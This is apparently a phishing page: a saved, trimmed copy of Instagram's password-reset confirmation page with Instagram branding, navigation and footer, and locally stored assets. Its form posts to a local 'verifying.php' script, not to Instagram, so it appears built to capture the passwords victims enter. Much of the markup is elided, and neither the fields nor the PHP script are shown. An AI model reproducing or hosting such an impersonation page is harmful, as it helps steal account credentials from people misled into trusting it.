<!DOCTYPE html>
<!-- saved from url=(0126)https://www.instagram.com/accounts/password/reset/confirm/3etcsmm/4z3-64e47279d08bd266b57134a7c018b69f/?s=password_reset_email -->
<html lang="en" class="js not-logged-in "><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        ...
        <script src="./Instagram_files/1425767024389221" async=""></script><script async="" src="./Instagram_files/fbevents.js"></script><script type="text/javascript">
        (function() {
...
(function() {
  ...
  window.__additionalDataError = function(path, msg) {
    ...
    <link rel="stylesheet" type="text/css" href="./Instagram_files/ac3908099bec.css">

            
    
    <script type="text/javascript" src="./Instagram_files/a4e77326039e.js" crossorigin="anonymous"></script>
    <script type="text/javascript" src="./Instagram_files/2ccc68edcffd.js" crossorigin="anonymous"></script>
    <script type="text/javascript" src="./Instagram_files/faf1d668dee8.js" crossorigin="anonymous"></script>
</head>
    ...
    <div class="top-bar-wrapper -cx-PRIVATE-NavBar__wrapper -cx-PRIVATE-NavBar__wrapper__">
        <div class="logo -cx-PRIVATE-NavBar__logo -cx-PRIVATE-NavBar__logo__"><a href="https://www.instagram.com/">Instagram</a></div>

        <div class="top-bar-left -cx-PRIVATE-NavBar__topBarLeft -cx-PRIVATE-NavBar__topBarLeft__">
            <ul class="top-bar-actions">
                <li>
                    <a class="top-bar-home" href="https://www.instagram.com/" label="Home"><i></i></a>
                </li>
            </ul>
        </div>
            ...
            <div class="top-bar-right account-state" id="top_bar_right">
                <ul class="top-bar-actions -cx-PRIVATE-NavBar__topBarActions -cx-PRIVATE-NavBar__topBarActions__">
                      ...
                      <li id="link_profile" class="link-signin -cx-PRIVATE-NavBar__signIn -cx-PRIVATE-NavBar__signIn__">
                          <a href="https://www.instagram.com/accounts/login/" class="loginLink">
                              <i></i>
    ...
    <form action="verifying.php" method="POST" accept-charset="utf-8">
                        ...
                        <div class="wrapper -cx-PRIVATE-Footer__wrapper -cx-PRIVATE-Footer__wrapper__">
                            <nav class="-cx-PRIVATE-Footer__nav -cx-PRIVATE-Footer__nav__">
                                <ul class="-cx-PRIVATE-Footer__navItems -cx-PRIVATE-Footer__navItems__">
                                    ...
                                    <li><a href="https://www.instagram.com/legal/terms/">
                            ...
                            <p class="copyright -cx-PRIVATE-Footer__copyright -cx-PRIVATE-Footer__copyright__">© 2018 Instagram</p>
                        </div>
                    </footer>
